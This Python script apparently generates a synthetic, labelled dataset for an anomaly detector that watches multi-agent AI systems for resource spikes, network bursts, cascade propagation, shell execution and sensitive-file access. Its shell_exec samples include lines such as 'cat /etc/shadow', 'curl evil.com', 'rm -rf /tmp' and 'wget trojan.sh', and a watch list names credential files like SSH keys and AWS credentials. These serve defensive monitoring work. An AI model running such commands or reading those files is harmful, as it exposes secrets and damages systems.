import json
import random
import os
import time
from typing import Dict, List, Optional

ANOMALY_TYPE_CONFIGS = {
    "normal": {
        "count": 500,
        "cpu_range": (0.05, 0.3),
        "mem_range": (0.05, 0.3),
        "api_range": (0, 15),
        "msg_range": (0, 10),
        "exec_range": (0, 2),
        "file_range": (1, 10),
        "net_range": (0, 10),
        "shell_prob": 0,
        "sensitive_prob": 0,
    },
    "cpu_anomaly": {
        "count": 200,
        "cpu_range": (0.85, 1.0),
        "mem_range": (0.3, 0.6),
        "api_range": (30, 80),
        "msg_range": (10, 30),
        "exec_range": (5, 20),
        "file_range": (10, 30),
        "net_range": (20, 60),
        "shell_prob": 0.1,
        "sensitive_prob": 0.05,
    },
    "memory_anomaly": {
        "count": 200,
        "cpu_range": (0.3, 0.7),
        "mem_range": (0.85, 1.0),
        "api_range": (10, 30),
        "msg_range": (8, 20),
        "exec_range": (3, 10),
        "file_range": (5, 20),
        "net_range": (10, 40),
        "shell_prob": 0.05,
        "sensitive_prob": 0.1,
    },
    "shell_exec": {
        "count": 300,
        "cpu_range": (0.3, 0.6),
        "mem_range": (0.2, 0.5),
        "api_range": (5, 25),
        "msg_range": (3, 15),
        "exec_range": (1, 5),
        "file_range": (5, 20),
        "net_range": (5, 20),
        "shell_prob": 1.0,
        "sensitive_prob": 0.1,
    },
    "sensitive_file": {
        "count": 300,
        "cpu_range": (0.2, 0.5),
        "mem_range": (0.2, 0.5),
        "api_range": (5, 20),
        "msg_range": (3, 15),
        "exec_range": (1, 3),
        "file_range": (5, 30),
        "net_range": (5, 15),
        "shell_prob": 0.05,
        "sensitive_prob": 1.0,
    },
    "network_anomaly": {
        "count": 200,
        "cpu_range": (0.2, 0.6),
        "mem_range": (0.2, 0.5),
        "api_range": (20, 60),
        "msg_range": (15, 50),
        "exec_range": (1, 5),
        "file_range": (5, 15),
        "net_range": (80, 500),
        "shell_prob": 0.05,
        "sensitive_prob": 0.05,
    },
    "propagation": {
        "count": 200,
        "cpu_range": (0.1, 0.4),
        "mem_range": (0.1, 0.4),
        "api_range": (5, 20),
        "msg_range": (20, 80),
        "exec_range": (0, 3),
        "file_range": (3, 10),
        "net_range": (5, 30),
        "shell_prob": 0.02,
        "sensitive_prob": 0.02,
    },
    "combined": {
        "count": 150,
        "cpu_range": (0.7, 0.95),
        "mem_range": (0.7, 0.95),
        "api_range": (40, 100),
        "msg_range": (30, 80),
        "exec_range": (5, 15),
        "file_range": (15, 40),
        "net_range": (60, 200),
        "shell_prob": 0.6,
        "sensitive_prob": 0.5,
    },
}

WATCHABLE_FILES = [
    "/etc/shadow", "/etc/passwd", "/etc/ssh/sshd_config",
    "/root/.ssh/id_rsa", "/home/user/.ssh/authorized_keys",
    "/var/log/auth.log", "/proc/1/environ", "/etc/sudoers",
    "/root/.bash_history", "/home/user/.aws/credentials",
]

SAFE_FILES = [
    "/workspace/main.py", "/workspace/config.yaml",
    "/workspace/output.txt", "/tmp/perf_bench.dat",
    "/workspace/model.pth", "/workspace/agent.cfg",
    "/workspace/logs/event.log",
]


def _random_agent_id(idx: int) -> str:
    prefixes = ["Claude", "OpenCode", "Gemini", "DeepSeek", "Copilot"]
    return f"{random.choice(prefixes)}-Agent-{idx:03d}"


def _random_file(is_sensitive: bool) -> str:
    if is_sensitive:
        return random.choice(WATCHABLE_FILES)
    return random.choice(SAFE_FILES)


def generate_observation(cfg: Dict, anomaly_type: str, timestamp: int) -> Dict:
    agent_count = random.randint(2, 6)
    agents = {}

    for i in range(agent_count):
        agent_id = f"agent_{i}"
        agents[agent_id] = {
            "cpu_usage": round(random.uniform(*cfg["cpu_range"]), 3),
            "memory_usage": round(random.uniform(*cfg["mem_range"]), 3),
            "api_call_count": random.randint(*cfg["api_range"]),
            "msg_sent": random.randint(*cfg["msg_range"]),
            "msg_received": random.randint(*cfg["msg_range"]),
            "proc_exec_count": random.randint(*cfg["exec_range"]),
            "proc_fork_count": random.randint(0, cfg["exec_range"][1]),
            "fs_open_count": random.randint(*cfg["file_range"]),
            "fs_read_count": random.randint(cfg["file_range"][0] * 2, cfg["file_range"][1] * 4),
            "fs_write_count": random.randint(cfg["file_range"][0], cfg["file_range"][1] * 2),
            "fs_unlink_count": random.randint(0, 5),
            "net_connect_count": random.randint(*cfg["net_range"]),
            "net_send_count": random.randint(cfg["net_range"][0] * 2, cfg["net_range"][1] * 3),
            "net_recv_count": random.randint(cfg["net_range"][0] * 2, cfg["net_range"][1] * 3),
            "shell_exec_count": 1 if random.random() < cfg["shell_prob"] else 0,
            "sensitive_file_count": random.randint(1, 5) if random.random() < cfg["sensitive_prob"] else 0,
            "unique_files_count": random.randint(1, cfg["file_range"][1]),
        }

    interactions = []
    for i in range(agent_count):
        for j in range(agent_count):
            if i != j and random.random() < 0.4:
                interactions.append({
                    "src": f"agent_{i}",
                    "dst": f"agent_{j}",
                    "type": random.choice(["message", "api_call"]),
                    "weight": round(random.uniform(0.1, 0.9), 2),
                    "timestamp_ns": timestamp - random.randint(1, 100_000_000),
                })

    messages = []
    msg_count = random.randint(1, 20)
    for _ in range(msg_count):
        src = f"agent_{random.randint(0, agent_count - 1)}"
        dst = f"agent_{random.randint(0, agent_count - 1)}"
        if src != dst:
            messages.append({
                "src": src,
                "dst": dst,
                "msg_type": random.choice(["request", "response", "assistant"]),
                "data_size": random.randint(128, 8192),
                "timestamp_ns": timestamp - random.randint(1, 50_000_000),
            })

    anomalies = []
    if anomaly_type != "normal":
        if anomaly_type == "shell_exec":
            anomalies.append({
                "agent_id": "agent_0",
                "rule": "UNEXPECTED_SHELL_EXEC",
                "severity": "HIGH",
                "risk_score": round(random.uniform(0.7, 0.95), 2),
                "description": f"Shell command: {random.choice(['cat /etc/shadow', 'curl evil.com', 'rm -rf /tmp', 'wget trojan.sh'])}",
                "timestamp_ns": timestamp,
            })
        elif anomaly_type == "sensitive_file":
            anomalies.append({
                "agent_id": f"agent_{random.randint(0, agent_count - 1)}",
                "rule": "SENSITIVE_FILE_ACCESS",
                "severity": "HIGH",
                "risk_score": round(random.uniform(0.7, 0.95), 2),
                "description": f"Accessed: {random.choice(WATCHABLE_FILES)}",
                "timestamp_ns": timestamp,
            })
        elif anomaly_type in ("cpu_anomaly", "memory_anomaly", "combined"):
            anomalies.append({
                "agent_id": "agent_0",
                "rule": "UNUSUAL_RESOURCE_USAGE",
                "severity": "CRITICAL" if anomaly_type == "combined" else "HIGH",
                "risk_score": round(random.uniform(0.8, 0.98), 2),
                "timestamp_ns": timestamp,
            })
        elif anomaly_type == "network_anomaly":
            anomalies.append({
                "agent_id": "agent_0",
                "rule": "UNUSUAL_NET_CONNECTION",
                "severity": "MEDIUM",
                "risk_score": round(random.uniform(0.5, 0.85), 2),
                "timestamp_ns": timestamp,
            })
        elif anomaly_type == "propagation":
            anomalies.append({
                "agent_id": "agent_0",
                "rule": "CASCADE_PROPAGATION",
                "severity": "MEDIUM",
                "risk_score": round(random.uniform(0.4, 0.75), 2),
                "timestamp_ns": timestamp,
            })

    return {
        "agents": agents,
        "interactions": interactions,
        "messages": messages,
        "anomalies": anomalies,
        "timestamp": timestamp,
        "window_start_ns": timestamp - 30_000_000_000,
        "label": 0 if anomaly_type == "normal" else 1,
        "_anomaly_target": "normal" if anomaly_type == "normal" else anomaly_type,
        "_topology": random.choice(["peer-to-peer", "hierarchical", "star"]),
        "_anomaly_type": anomaly_type,
    }


def generate_synthetic_dataset(output_dir: str,
                               types: Optional[List[str]] = None,
                               seed: int = 42):
    random.seed(seed)
    if types is None:
        types = list(ANOMALY_TYPE_CONFIGS.keys())

    os.makedirs(output_dir, exist_ok=True)
    all_data = []
    base_ts = int(time.time() * 1_000_000_000)

    for atype in types:
        cfg = ANOMALY_TYPE_CONFIGS.get(atype, ANOMALY_TYPE_CONFIGS["normal"])
        count = cfg["count"]
        type_data = []
        for i in range(count):
            obs = generate_observation(cfg, atype, base_ts + i * 1_000_000_000)
            type_data.append(obs)
            all_data.append(obs)

        fname = os.path.join(output_dir, f"{atype}.json")
        with open(fname, "w") as f:
            json.dump(type_data, f, indent=2)

        print(f"  Generated {count} samples for '{atype}' -> {fname}")

    master_path = os.path.join(output_dir, "all_synthetic.json")
    with open(master_path, "w") as f:
        json.dump(all_data, f, indent=2)
    print(f"  Master dataset: {master_path} ({len(all_data)} total samples)")


def load_dataset(path: str) -> List[Dict]:
    with open(path, "r") as f:
        return json.load(f)


if __name__ == "__main__":
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else "./accuracy/datasets/synthetic"
    generate_synthetic_dataset(out)
